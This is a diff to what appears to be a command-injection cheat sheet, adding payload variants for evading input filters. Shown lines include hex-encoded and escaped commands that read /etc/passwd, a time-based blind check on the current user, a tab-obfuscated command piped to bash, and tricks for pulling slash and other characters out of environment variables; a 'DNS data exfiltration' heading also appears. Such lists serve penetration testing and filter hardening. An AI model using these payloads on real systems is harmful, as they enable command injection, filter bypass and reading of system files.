@@ -103,6 +103,9 @@ echo${IFS}test
 # Using hex format
 X=$'cat\x20/etc/passwd'&&$X
 
+# Using tabs
+echo "ls\x09-l" | bash
+
 # New lines
 p\
 i\
@@ -144,6 +147,13 @@ cat `xxd -r -ps <(echo 2f6574632f706173737764)`
 
 ```bash
 time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
+```
+
+### Getting chars from Env Variables
+
+```bash
+echo ${LS_COLORS:10:1} #;
+echo ${PATH:0:1} #/
 ```
 
 ### DNS data exfiltration
